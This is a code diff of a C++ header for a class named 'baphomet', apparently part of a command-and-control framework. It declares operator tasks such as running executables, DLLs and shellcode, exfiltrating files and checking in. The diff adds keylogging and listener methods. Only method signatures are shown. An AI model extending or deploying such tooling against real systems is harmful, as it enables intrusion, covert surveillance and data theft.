@@ -22,9 +22,6 @@ private:
 
 public:
 
-    result<std::string> generic_queue_task(const command& cmd, std::vector<std::string> args, const std::string& queue_message);
-    bool file_is_staged(const std::string& file_name) const;
-
     result<std::string> runexe(reciever_context& ctx);
     result<std::string> rundll(reciever_context& ctx);
     result<std::string> runshellcode(reciever_context& ctx);
@@ -35,6 +32,7 @@ public:
     result<std::string> print_tasks() const;
     result<std::string> print_staged_files() const;
     result<std::string> clear_tasks();
+    result<std::string> print_listeners() const;
 
     result<std::string> cp(reciever_context& ctx);
     result<std::string> cat(reciever_context& ctx);
@@ -46,13 +44,20 @@ public:
     result<std::string> exfil(reciever_context& ctx);
     result<std::string> indicate_exit(reciever_context& ctx);
     result<std::string> checkin(reciever_context& ctx);
+    result<std::string> keylog(reciever_context& ctx);
+    result<std::string> start_listener(reciever_context& ctx) const;
 
-    static result<std::string> delimit_command(const std::vector<std::string>& strings);
-    static void init_commands();
 
-    result<std::filesystem::path> upload(const std::string &file, const std::string &extension) override;
-    result<std::string> receive(reciever_context& ctx) override;
+    static result<std::string>      delimit_command(const std::vector<std::string>& strings);
+    static void                     init_commands();
+    result<std::string>             generic_queue_task(const command& cmd, std::vector<std::string> args, const std::string& queue_message);
+    bool                            file_is_staged(const std::string& file_name) const;
 
+
+    result<std::filesystem::path>   upload(const std::string &file, const std::string &extension) override;
+    result<std::string>             receive(reciever_context& ctx) override;
+
+    ~baphomet() override;
     explicit baphomet(const std::optional<std::weak_ptr<owner>> &parent, instance* const root)
         : leaf(parent, root) {
     }
